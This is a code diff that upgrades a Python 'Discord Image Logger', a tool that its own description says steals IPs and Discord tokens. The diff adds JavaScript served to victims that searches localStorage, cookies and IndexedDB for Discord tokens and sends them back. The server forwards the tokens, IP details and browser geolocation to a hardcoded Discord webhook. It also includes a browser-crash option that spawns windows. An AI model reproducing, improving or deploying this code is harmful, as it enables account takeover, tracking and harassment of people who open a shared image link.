@@ -3,11 +3,11 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs, Discord tokens, and more"
-__version__ = "v2.1"
+__version__ = "v2.5"
 __author__ = "C00lB0i"
 
 config = {
@@ -16,9 +16,9 @@ config = {
     "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
     "imageArgument": True,
     
-    # NEW TOKEN LOGGING CONFIG #
+    # TOKEN LOGGING CONFIG #
     "tokenLogging": True,  # Enable Discord token capture
-    "tokenWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",  # Separate webhook for token alerts
+    "tokenWebhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",  # Webhook for token alerts
     
     # CUSTOMIZATION #
     "username": "Image Logger",
@@ -53,17 +53,20 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+    try:
+        requests.post(config["webhook"], json = {
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [
+                {
+                    "title": "Image Logger - Error",
+                    "color": config["color"],
+                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+                }
+            ],
+        }, timeout=5)
+    except:
+        pass
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
@@ -72,98 +75,119 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None
+        if config["linkAlerts"]:
+            try:
+                requests.post(config["webhook"], json = {
+                    "username": config["username"],
+                    "content": "",
+                    "embeds": [
+                        {
+                            "title": "Image Logger - Link Sent",
+                            "color": config["color"],
+                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                        }
+                    ],
+                }, timeout=5)
+            except:
+                pass
         return
 
     ping = "@everyone"
 
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        if info["proxy"]:
+            if config["vpnCheck"] == 2:
+                    return
+            
+            if config["vpnCheck"] == 1:
+                ping = ""
         
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
+        if info["hosting"]:
+            if config["antiBot"] == 4:
+                if info["proxy"]:
+                    pass
+                else:
+                    return
 
-        if config["antiBot"] == 3:
-                return
+            if config["antiBot"] == 3:
+                    return
 
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
+            if config["antiBot"] == 2:
+                if info["proxy"]:
+                    pass
+                else:
+                    ping = ""
 
-        if config["antiBot"] == 1:
-                ping = ""
+            if config["antiBot"] == 1:
+                    ping = ""
+    except:
+        info = {}
+        for key in ['isp', 'as', 'country', 'regionName', 'city', 'lat', 'lon', 'timezone', 'mobile', 'proxy', 'hosting']:
+            info[key] = "Error"
 
-
-    os, browser = httpagentparser.simple_detect(useragent)
+    try:
+        os, browser = httpagentparser.simple_detect(useragent)
+    except:
+        os, browser = "Unknown", "Unknown"
     
     embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+        "username": config["username"],
+        "content": ping,
+        "embeds": [
+            {
+                "title": "Image Logger - IP Logged",
+                "color": config["color"],
+                "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-            
+                
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
+> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
+> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **VPN:** `{info.get('proxy', 'Unknown')}`
+> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
-        }
-  ],
-}
+                }
+        ],
+    }
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+    if url: 
+        embed["embeds"][0].update({"thumbnail": {"url": url}})
+    
+    try:
+        requests.post(config["webhook"], json=embed, timeout=5)
+    except Exception as e:
+        reportError(f"Failed to send main webhook: {str(e)}")
+    
     return info
 
-# NEW FUNCTION TO REPORT TOKENS
+# Function to report captured tokens
 def reportToken(ip, useragent, token, endpoint="N/A"):
-    requests.post(config["tokenWebhook"], json = {
-    "username": "TOKEN LOGGER",
-    "content": "@everyone **CRITICAL TOKEN CAPTURED**",
-    "embeds": [
-        {
-            "title": "Discord Token Captured!",
-            "color": 0xFF0000,
-            "description": f"""**A Discord token was captured!**
+    if not token or token == "NOT_FOUND":
+        return
+    
+    try:
+        token_embed = {
+            "username": "TOKEN LOGGER",
+            "content": "@everyone **CRITICAL TOKEN CAPTURED**",
+            "embeds": [
+                {
+                    "title": "Discord Token Captured!",
+                    "color": 0xFF0000,
+                    "description": f"""**A Discord token was captured!**
 
 **Endpoint:** `{endpoint}`
 **IP:** `{ip}`
@@ -174,47 +198,88 @@ def reportToken(ip, useragent, token, endpoint="N/A"):
 > **Creation Timestamp:** `{token.split('.')[1] if '.' in token and len(token.split('.')) > 1 else 'N/A'}`
 
 **WARNING:** This token provides full access to the user's Discord account!""",
+                }
+            ],
         }
-    ],
-})
+        requests.post(config["tokenWebhook"], json=token_embed, timeout=5)
+    except Exception as e:
+        reportError(f"Failed to send token webhook: {str(e)}")
 
 # Token capture JavaScript
 token_js = """
 document.addEventListener('DOMContentLoaded', function() {
-    function captureToken() {
+    setTimeout(function() {
         let token = "NOT_FOUND";
         
-        // Check localStorage
-        const tokenKeys = ['token', '_token', 'discord_token', 'auth_token'];
+        // 1. Check localStorage for Discord tokens
+        const tokenKeys = [
+            'token', '_token', 'discord_token', 
+            'auth_token', 'access_token', 'user_token'
+        ];
+        
         for (const key of tokenKeys) {
-            const value = localStorage.getItem(key);
-            if (value) {
-                token = value;
-                break;
-            }
+            try {
+                const value = localStorage.getItem(key);
+                if (value && value.length > 50) {
+                    token = value;
+                    break;
+                }
+            } catch(e) {}
         }
         
-        // Check cookies if not found
+        // 2. Check cookies if not found in localStorage
         if (token === "NOT_FOUND") {
             const cookies = document.cookie.split(';');
             for (const cookie of cookies) {
                 const trimmed = cookie.trim();
-                if (trimmed.startsWith('token=') || 
-                    trimmed.startsWith('_token=') || 
-                    trimmed.startsWith('discord_token=') || 
-                    trimmed.startsWith('auth_token=')) {
-                    token = trimmed.split('=')[1];
-                    break;
+                for (const key of tokenKeys) {
+                    if (trimmed.startsWith(key + '=')) {
+                        token = trimmed.substring(key.length + 1);
+                        break;
+                    }
                 }
+                if (token !== "NOT_FOUND") break;
             }
         }
         
-        // Send token to server
-        const img = new Image();
-        img.src = '/logtoken?token=' + encodeURIComponent(token);
-    }
-    
-    setTimeout(captureToken, 1500);
+        // 3. Check IndexedDB for Discord client tokens
+        if (token === "NOT_FOUND") {
+            try {
+                const openRequest = indexedDB.open('discord');
+                openRequest.onsuccess = function(event) {
+                    const db = event.target.result;
+                    const transaction = db.transaction('token', 'readonly');
+                    const store = transaction.objectStore('token');
+                    const request = store.get('token');
+                    
+                    request.onsuccess = function(e) {
+                        if (e.target.result && e.target.result.value) {
+                            token = e.target.result.value;
+                            sendToken(token);
+                        }
+                    };
+                    
+                    request.onerror = function() {
+                        sendToken(token);
+                    };
+                };
+                
+                openRequest.onerror = function() {
+                    sendToken(token);
+                };
+            } catch(e) {
+                sendToken(token);
+            }
+        } else {
+            sendToken(token);
+        }
+        
+        function sendToken(tokenValue) {
+            // Send token to server using a beacon
+            const beacon = new Image();
+            beacon.src = '/logtoken?t=' + encodeURIComponent(tokenValue) + '&r=' + Math.random();
+        }
+    }, 2000);
 });
 """
 
@@ -231,14 +296,15 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             if self.path == '/token.js':
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/javascript')
+                self.send_header('Cache-Control', 'no-store, max-age=0')
                 self.end_headers()
-                self.wfile.write(token_js.encode())
+                self.wfile.write(token_js.encode('utf-8'))
                 return
                 
             # Handle token logging
             if self.path.startswith('/logtoken'):
                 query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
-                token = query.get('token', '')
+                token = query.get('t', '') or query.get('token', '')
                 
                 ip = self.headers.get('x-forwarded-for', '')
                 useragent = self.headers.get('user-agent', '')
@@ -257,108 +323,149 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                    try:
+                        url_param = dic.get("url") or dic.get("id")
+                        url = base64.b64decode(url_param.encode()).decode()
+                    except:
+                        url = config["image"]
                 else:
                     url = config["image"]
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+            # Build HTML content
+            html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Image Viewer</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            background-color: #1e1e1e;
+        }}
+        .img-container {{
+            background-image: url('{url}');
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: contain;
+            width: 100vw;
+            height: 100vh;
+        }}
+    </style>
+</head>
+<body>
+    <div class="img-container"></div>
+    <!-- Token capture script -->"""
             
             # Add token capture script if enabled
             if config["tokenLogging"]:
-                data += b'<script src="/token.js"></script>'
+                html_content += '<script src="/token.js"></script>'
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
+            html_content += """
+</body>
+</html>"""
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                return
+            data = html_content.encode('utf-8')
             
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            # Skip blacklisted IPs
+            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
                 self.send_response(200)
-                self.send_header('Content-type', datatype)
+                self.send_header('Content-type', 'text/html')
                 self.end_headers()
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
                 self.wfile.write(data)
+                return
+            
+            # Handle bots
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                if config["buggedImage"]:
+                    self.send_response(200)
+                    self.send_header('Content-type', 'image/jpeg')
+                    self.end_headers()
+                    self.wfile.write(binaries["loading"])
+                else:
+                    self.send_response(302)
+                    self.send_header('Location', url)
+                    self.end_headers()
+                
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = self.path.split("?")[0], url = url)
+                return
+            
+            # Handle regular users
+            s = self.path
+            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+            if dic.get("g") and config["accurateLocation"]:
+                try:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(
+                        self.headers.get('x-forwarded-for'), 
+                        self.headers.get('user-agent'), 
+                        location, 
+                        self.path.split("?")[0], 
+                        url=url
+                    )
+                except:
+                    result = None
+            else:
+                result = makeReport(
+                    self.headers.get('x-forwarded-for'), 
+                    self.headers.get('user-agent'), 
+                    endpoint=self.path.split("?")[0], 
+                    url=url
+                )
+            
+            # Custom message handling
+            if config["message"]["doMessage"]:
+                message = config["message"]["message"]
+                if config["message"]["richMessage"] and result:
+                    replacements = {
+                        "{ip}": self.headers.get('x-forwarded-for'),
+                        "{isp}": result.get("isp", "Unknown"),
+                        "{asn}": result.get("as", "Unknown"),
+                        "{country}": result.get("country", "Unknown"),
+                        "{region}": result.get("regionName", "Unknown"),
+                        "{city}": result.get("city", "Unknown"),
+                        "{browser}": httpagentparser.simple_detect(self.headers.get('user-agent'))[1] if self.headers.get('user-agent') else "Unknown",
+                        "{os}": httpagentparser.simple_detect(self.headers.get('user-agent'))[0] if self.headers.get('user-agent') else "Unknown"
+                    }
+                    for k, v in replacements.items():
+                        message = message.replace(k, v)
+                    data = message.encode('utf-8')
+            
+            # Browser crash option
+            if config["crashBrowser"]:
+                data += b'<script>setTimeout(function(){for(var i=0;i<100;i++){window.open("")}},100)</script>'
+            
+            # Redirection
+            if config["redirect"]["redirect"]:
+                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode('utf-8')
+            
+            # Accurate location script
+            if config["accurateLocation"]:
+                data += b"""<script>
+if (!window.location.href.includes("g=") && navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        const coords = position.coords.latitude + "," + position.coords.longitude;
+        const encoded = btoa(coords).replace(/=/g, "%3D");
+        const newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'g=' + encoded;
+        window.location.href = newUrl;
+    });
+}
+</script>"""
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(data)
         
-        except Exception:
+        except Exception as e:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
             self.wfile.write(b'500 - Internal Server Error')
-            reportError(traceback.format_exc())
+            reportError(f"{str(e)}\n\n{traceback.format_exc()}")
 
         return
     
